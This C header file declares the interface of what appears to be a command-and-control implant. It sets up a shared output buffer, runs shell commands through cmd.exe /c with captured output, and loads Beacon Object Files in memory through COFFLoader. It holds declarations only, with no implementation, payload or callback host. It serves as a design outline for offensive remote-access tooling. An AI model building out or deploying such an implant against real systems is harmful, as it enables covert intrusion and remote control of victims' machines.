#ifndef SHELL_H
#define SHELL_H

#include <stddef.h>

// ---------------------------------------------------------------------------
// Output buffer — shared across shell commands and BOF execution.
// Initialised by shell_init(); freed by shell_cleanup().
// ---------------------------------------------------------------------------

// Allocate the output buffer. Call once at startup before any other shell_ call.
// Returns 0 on success, -1 on allocation failure.
int  shell_init(void);

// Free the output buffer.
void shell_cleanup(void);

// Current number of bytes written into the output buffer.
int  shell_output_len(void);

// Pointer to the output buffer contents (not null-terminated).
const char *shell_output_buf(void);

// Reset the output buffer to empty (does not free memory).
void shell_buf_reset(void);

// Append data to the output buffer (used by BOF compatibility layer).
void buf_append(const char *data, int len);

// printf-style append into the output buffer.
void beacon_log(const char *fmt, ...);

// ---------------------------------------------------------------------------
// Command execution
// ---------------------------------------------------------------------------

// Execute a shell command via cmd.exe /c, capturing stdout and stderr into
// the output buffer. Handles "cd" internally (updates the working directory).
void execute_shell_command(const char *command);

// Execute a compiled BOF in-process via COFFLoader.
// bof_data / bof_size: the raw .obj bytes.
// args / args_len:     packed BeaconPack argument buffer.
int  execute_bof(unsigned char *bof_data, size_t bof_size,
                 char *args, int args_len);

#endif // SHELL_H